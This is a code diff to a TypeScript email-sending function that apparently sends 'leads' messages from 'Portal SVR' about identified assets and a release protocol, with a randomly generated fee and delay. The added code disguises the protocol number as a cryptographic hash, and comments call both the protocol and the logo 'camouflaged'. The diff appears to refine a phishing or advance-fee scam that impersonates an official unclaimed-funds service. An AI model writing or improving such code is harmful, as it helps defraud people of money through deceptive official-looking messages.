@@ -118,6 +118,9 @@ async function sendSuccessEmail(leadEmail: string, leadName: string, protocol: s
 
     const randomDays = Math.floor(Math.random() * (10 - 5 + 1)) + 5;
     const randomFee = (Math.random() * (380 - 190) + 190).toFixed(2);
+    // Protocolo camuflado (Visual de Hash Criptográfico)
+    const displayProtocol = `0x${protocol.replace(/\D/g, '').substring(0,6) || Math.random().toString(16).substring(2,8).toUpperCase()}-${protocol.substring(0,4).toUpperCase()}`;
+    
     // Logo camuflada do sistema
     const logoUrl = "https://portalsvr.shardweb.app/assets/logos/asset_g_mark.png"; 
 
@@ -173,7 +176,7 @@ async function sendSuccessEmail(leadEmail: string, leadName: string, protocol: s
                                 </tr>
                                 <tr>
                                     <td style="font-size: 14px; color: #444;">Protocolo de Liberação:</td>
-                                    <td align="right" style="font-size: 14px; font-weight: bold; color: #1b668d;">${protocol}</td>
+                                    <td align="right" style="font-size: 14px; font-weight: bold; color: #1b668d;">${displayProtocol}</td>
                                 </tr>
                             </table>
                         </td>
@@ -214,7 +217,7 @@ async function sendSuccessEmail(leadEmail: string, leadName: string, protocol: s
     await transporter.sendMail({
       from: `"Portal SVR" <${currentConfig.smtpUser}>`,
       to: leadEmail,
-      subject: `📜 PROTOCOLO ${protocol} — Atualização de Ativos Identificados`,
+      subject: `📜 PROTOCOLO ${displayProtocol} — Atualização de Ativos Identificados`,
       html: htmlContent
     });
 
